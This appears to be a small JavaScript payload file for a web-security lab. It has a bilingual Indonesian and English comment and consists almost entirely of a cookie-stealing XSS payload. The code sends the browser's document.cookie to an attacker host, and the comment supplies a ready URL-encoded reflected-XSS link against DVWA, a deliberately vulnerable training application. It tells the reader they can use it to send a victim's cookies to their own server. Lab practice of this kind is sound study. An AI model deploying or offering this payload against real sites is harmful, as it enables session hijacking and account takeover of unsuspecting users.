new Image().src =
  "https://attacker.localhost/cookies/" + encodeURIComponent(document.cookie);

/* 

Indonesia : 
Kode berikut akan dijalankan di browser setelah di-URL encode. 
Kamu bisa menggunakan kode ini untuk mengirim cookie korban ke servermu. 
Contoh link payload reflected XSS di DVWA:

https://vuln.localhost/vulnerabilities/xss_r/?name=%3Cscript%3Enew%20Image().src%3D%22https%3A%2F%2Fattacker.localhost%2Fcookies%2F%22%2BencodeURIComponent(document.cookie)%3B%3C%2Fscript%3E

English : 
The following code will execute in the browser after URL encoding. 
You can use this code to send the victim's cookies to your server. 
Example of a reflected XSS payload link in DVWA:

https://vuln.localhost/vulnerabilities/xss_r/?name=%3Cscript%3Enew%20Image().src%3D%22https%3A%2F%2Fattacker.localhost%2Fcookies%2F%22%2BencodeURIComponent(document.cookie)%3B%3C%2Fscript%3E

*/
